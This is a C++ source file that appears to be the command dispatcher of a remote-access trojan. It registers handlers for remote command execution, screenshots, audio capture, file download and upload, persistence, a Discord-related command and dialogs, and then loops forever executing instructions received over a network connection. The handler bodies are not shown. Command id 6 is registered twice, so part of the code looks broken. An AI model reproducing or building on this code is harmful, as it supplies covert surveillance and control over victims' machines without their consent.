#include "controller.h"
#include <memory>
#include <iostream>
#include <string>
#include <vector>
#include "packet.h"
#include "simplepacket.h"
#include "simplecommand.h"
#include "commands.h"
using namespace std;

void register_all_commands() {
    register_command(3, navigation);
	register_command(4, discordCommand);
	register_command(5, exec);
	register_command(6, screenshot);
	register_command(6, audioCommand);
	register_command(8, downloadFile);
	register_command(9, uploadFile);
	register_command(10, persist);
	register_command(11, dialog);
}

void Controller::init() {
	register_all_commands();
}

void Controller::loop() {
	while (true) {
		SerializedPacket spkt = conn->read_packet();
		Packet::handle_packet(*this, *Packet::parse(spkt).get());
	}
}

void Controller::ret(char retcode) {
	SimplePacket<char> pkt(0, retcode);
	conn->write_packet_sync(pkt.serialize());
}

void Controller::print(string out) {
 	SimplePacket<string> pkt(1, out);
 	conn->write_packet_sync(pkt.serialize());
}

void Controller::println(string out) {
	out += "\n";
 	print(out);
}

void Controller::err_println(string err) {
 	SimplePacket<string> pkt(2, err);
 	conn->write_packet_sync(pkt.serialize());
}

void Controller::send_buffer(const vector<char> buf) {
	SimplePacket<vector<char>> pkt(3, buf);
	conn->write_packet_sync(pkt.serialize());
}
